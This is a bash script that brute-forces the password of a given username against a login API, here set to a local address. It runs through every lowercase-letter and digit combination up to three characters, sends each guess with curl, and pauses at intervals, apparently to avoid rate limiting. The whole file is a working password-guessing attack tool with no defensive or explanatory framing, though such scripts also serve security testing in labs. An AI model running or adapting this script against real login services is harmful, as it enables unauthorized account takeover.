#!/usr/bin/env bash

API="http://127.0.0.1:8000/login"

# Character set (letters + digits)
CHARS=(a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9)
MAXLEN=3
DELAY=0
PAUSE_EVERY=400
PAUSE_TIME=0.15

USER="$1"        

attempts=0
start=$(date +%s)

attempt() {
  pwd="$1"
  attempts=$((attempts+1))

  payload='{"username":"'"$USER"'","password":"'"$pwd"'"}'
  resp=$(curl -s "$API" \
    -H "Content-Type: application/json" \
    --data "$payload")

  echo "[$attempts] '$pwd' -> $resp"

  if [[ "$resp" == *"login successful"* ]]; then
    end=$(date +%s)
    echo "FOUND: password='$pwd' in $attempts attempts, $((end-start))s"
    exit 0
  fi

  
  if (( attempts % PAUSE_EVERY == 0 )); then
    sleep "$PAUSE_TIME"
  fi
}

echo "[*] Brute-force on '$USER' | chars=${CHARS[*]} | maxlen=$MAXLEN"

# len=1
for c1 in "${CHARS[@]}"; do
  attempt "$c1"
done

# len=2
if [ "$MAXLEN" -ge 2 ]; then
  for c1 in "${CHARS[@]}"; do
    for c2 in "${CHARS[@]}"; do
      attempt "$c1$c2"
    done
  done
fi

# len=3
if [ "$MAXLEN" -ge 3 ]; then
  for c1 in "${CHARS[@]}"; do
    for c2 in "${CHARS[@]}"; do
      for c3 in "${CHARS[@]}"; do
        attempt "$c1$c2$c3"
      done
    done
  done
fi

echo "NOT found (up to length $MAXLEN). Attempts: $attempts"
exit 1
